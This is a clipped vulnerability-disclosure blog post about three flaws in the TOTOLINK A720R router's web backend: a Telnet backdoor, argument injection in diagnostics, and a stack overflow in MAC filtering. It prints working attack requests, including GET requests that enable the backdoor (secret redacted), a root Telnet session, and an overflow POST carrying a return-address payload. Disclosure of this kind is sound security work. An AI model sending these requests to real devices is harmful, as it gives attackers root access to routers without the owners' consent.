---
title: "One Router, Three Vulnerabilities: Security Research on the TOTOLINK A720R"
source: https://www.hacktivesecurity.com/blog/2026/09/16/one-router-three-vulnerabilities-security-research-on-the-totolink-a720r/
source_host: www.hacktivesecurity.com
clip_date: 2026-10-05T10:14:50+08:00
trace_id: e0752aea-9c6a-4817-82b2-9ef692749b0b
content_hash: c999670879956b27715c584425acc5c614d65d38a308bc5d67e902e08de578b3
status: synced
tags:
  - 漏洞分析
  - 硬件逆向
series: null
feed_source: Hacktive Security·漏洞研究
ai_summary: TOTOLINK A720R 路由器 `cstecgi.cgi` 组件存在三个漏洞，厂商未回应且截至成文无补丁。
ai_summary_style: key-points
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 3f075244-d011-8170-bba2-c96c02065b2a
ioc:
  cves:
    - CVE-2025-63821
    - CVE-2026-82539
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TOTOLINK A720R 路由器 `cstecgi.cgi` 组件存在三个漏洞，厂商未回应且截至成文无补丁。
> 
> - **Telnet 后门：** 无需认证即可用固件内硬编码密钥加日期推导码（如 `07112026`）通过 HTTP 请求启用，随后以 root 登录 Telnet 获取 shell；被厂商标记为旧漏洞重复上报。
> - **CVE-2025-63821 参数注入：** 诊断/路由追踪功能未校验用户可控 IP 字段，以 `-` 开头的值被 `traceroute`/`ping` 当作选项解析；使用 `#` 字符可致诊断功能永久失效，需重启设备恢复。
> - **CVE-2026-82539 栈溢出：** MAC 过滤的 `desc` 参数被无边界检查拷入固定栈缓冲区，超长值触发崩溃（HTTP 500）；因二进制缺少 PIE 与 Canary，可劫持返回地址跳到已有代码开启 Telnet（nmap 扫到 23 端口开放）。
> - **影响差异：** 后门无需认证、风险最高；参数注入影响有限；栈溢出可可靠控制执行流，与外网可达、默认口令条件叠加可形成远程 root 立足点，且能与后门组合放大危害。
> - **披露状态：** 2025 年 9 月报告厂商，无回应、无固件补丁；旧固件版本疑似已存在类似 Telnet 后门。

The research was conducted on the TOTOLINK A720R router, on its latest available firmware. During said research, I identified three separate vulnerabilities affecting the same component handling the backend of the web management interface:

-   **Telnet backdoor**: a hidden, unauthenticated Telnet service protected by a hardcoded secret.
-   **Argument Injection (CVE-2025-63821)**: insufficient input validation allowing user-controlled arguments to be passed to diagnostic commands.
-   **Stack-based Buffer Overflow (CVE-2026-82539)**: a stack overflow in the MAC filtering functionality allowing reliable control of the application’s execution flow.

Two of the findings were assigned CVEs, while the telnet backdoor was flagged as a duplicate of an old existing vulnerability (even though the means by which it is enabled and accessed are very different).

## The Research

The analysis started from the firmware. After extracting the filesystem, I focused on the web management interface and its CGI backend.

Most of the web application’s functionality is handled by a single binary, `cstecgi.cgi`. Reverse engineering of this file via static and dynamic analysis led to the identification of three vulnerabilities.

## The Telnet Backdoor

A hidden Telnet functionality was discovered in `cstecgi.cgi`. The functionality can be reached without authentication and relies on a hardcoded credential embedded in the firmware together with a predictable date-based value. The backdoor can be enabled by sending the following HTTP requests:

```
GET /cgi-bin/cstecgi.cgi?action=telnet&enable=1&password=BASE64_SECRET_REDACTED&code=07112026 HTTP/1.1
Host: 192.168.0.1
```

```
GET /cgi-bin/cstecgi.cgi?action=telnet&enable=2&password=BASE64_SECRET_REDACTED&code=07112026 HTTP/1.1
Host: 192.168.0.1
```

Once triggered, the device starts a Telnet service and provides access to a root shell, using the same password.

```swift
$ telnet 192.168.0.1

Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
TOTOLINK login: root
Password:
RLX Linux version 2.0

         _               _  _
        | |             | ||_|
   _  _ | | _  _        | | _ ____  _   _  _  _ 
  | |/ || |\ \/ /       | || |  _ \| | | |\ \/ /
  | |_/ | |/    \       | || | | | | |_| |/    \
  |_|   |_|\_/\_/       |_||_|_| |_|\____|\_/\_/ 

For further information check:
http://processor.realtek.com/

# ls
bin        etc        init       lighttp    proc       sys        usr        web_cste
dev        home       lib        mnt        root       tmp        var
```

## CVE-2025-63821

The diagnostic functionality was found to be vulnerable to argument injection due to insufficient validation of the user-controlled IP address field. By supplying a value beginning with **`-`**, an attacker can cause the input to be interpreted as an option by the underlying `traceroute` or `ping` command. The behavior can be observed in the Route Tracking functionality, where a crafted value results in an `invalid option` error being returned by `traceroute`.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/41e80441eca8f509.png)

In addition, the use of the **`#`** character allows the generated command to be modified in a way that leaves the Diagnosis functionality permanently unavailable. As shown below, after sending the crafted input, the Diagnosis button remains disabled even after reloading the page: rebooting the device is needed.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/acd5612c1603b510.png)

## CVE-2026-82539

A stack-based buffer overflow was identified in the MAC filtering functionality. The `desc` parameter is copied into a fixed-size stack buffer without proper bounds checking. Sending an oversized value is sufficient to trigger the overflow, causing the CGI process to terminate and the web server to return an HTTP 500 error.

![](https://www.hacktivesecurity.com/wp-content/uploads/2026/09/img_1-1024x395.png)

The vulnerability can also be exploited to influence the execution flow of the process, since the `cstecgi.cgi` binary lacks protections such as `PIE` and `Canary`. During testing, the overflow was used to reach existing code responsible for enabling the Telnet service. The result was confirmed by scanning the device after sending the crafted request, with port 23 becoming accessible and the Telnet service reported as open.

```python
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

{"mac":"AA:BB:CC:AA:BB:CC","desc":"AAAA...[190 bytes of padding]...\xb4\x5c\x42","addEffect":"1","topicurl":"setMacFilterRules","token":"<token>"}
```

```
$ nmap 192.168.0.1 -p23

Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-11 13:51 +0000
Nmap scan report for 192.168.0.1
Host is up (0.0019s latency).

PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 0.59 seconds
```

*Note: in this case, even thought authentication to the web application is needed, the backdoor is enabled bypassing the prior code & password check, since the code that starts telnet is executed directly using the hijacking of the return address.*

## Impact

The three vulnerabilities have different levels of impact. The **Telnet backdoor** is particularly concerning because it does not require authentication: an attacker only needs the hardcoded secret embedded in the firmware, together with the predictable date-based code, to enable the Telnet service and obtain a root shell. If a router is exposed to the Internet with the Telnet port reachable, this could potentially allow a remote attacker to access the device without authentication.

The **Argument Injection (CVE-2025-63821)** currently has a more limited impact, primarily allowing manipulation of the diagnostic commands and persistent disruption of the Diagnosis functionality. In contrast, **CVE-2026-82539** is significantly more serious: the stack-based buffer overflow provides reliable control over the application’s execution flow and can therefore be used to execute existing code paths on the device. In an environment where routers are remotely reachable and administrative credentials are still set to their default values, an attacker could potentially trigger the vulnerability remotely. The combination of the buffer overflow with the Telnet backdoor further increases the overall impact, as the overflow can be leveraged to enable the Telnet service, providing a path toward a root-level foothold on the device.

## Conclusions

The vulnerabilities were reported to the vendor in September 2025, but no response was received and no firmware patch is available at the time of writing. More concerningly, a similar Telnet backdoor mechanism appears to have been present in previous firmware versions as well, suggesting that this functionality has existed for some time without being removed.

A router represents the gateway between a local network and the Internet and is therefore expected to provide, rather than undermine, a fundamental security boundary for the devices behind it. For this reason, undocumented privileged functionality such as a Telnet backdoor should not be present in the firmware, especially when its activation relies on a hardcoded secret.

These findings also highlight the importance of maintaining a clear security boundary between administrative functionality and undocumented or legacy features. The fact that such functionality can remain present across firmware versions, combined with the lack of a vendor response or available patch, raises concerns about the long-term security maintenance of the device.
